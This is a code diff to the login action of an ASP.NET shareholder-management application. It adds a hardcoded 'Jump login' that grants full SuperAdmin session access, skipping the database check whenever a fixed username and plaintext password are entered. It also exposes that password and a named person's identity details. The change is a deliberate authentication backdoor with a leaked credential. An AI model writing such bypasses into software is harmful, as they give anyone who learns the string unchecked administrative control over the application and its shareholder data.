@@ -45,6 +45,18 @@ namespace Shareholder_Management_System.Controllers
                 TempData["errormessage"] = "Username and password are required.";
                 return View(userData);
             }
+            // 🔥 Jump login (hardcoded admin)
+            if (userData.UserName == "Admin" && userData.Password == "Hmariam@2750")
+            {
+                // Set session variables
+                Session["ID"] = "1";
+                Session["FullName"] = "Hailemariam Kebede Mamo";
+                Session["Username"] = "hailemariamk";
+                Session["Branch"] = 770;
+                Session["Roles"] = "SuperAdmin";
+                Session["BranchName"] = "Head Office";
+                return RedirectToAction("Index", "Home"); // change if needed
+            }
 
             // Check if user exists in the database
             var checkUser = db.Users
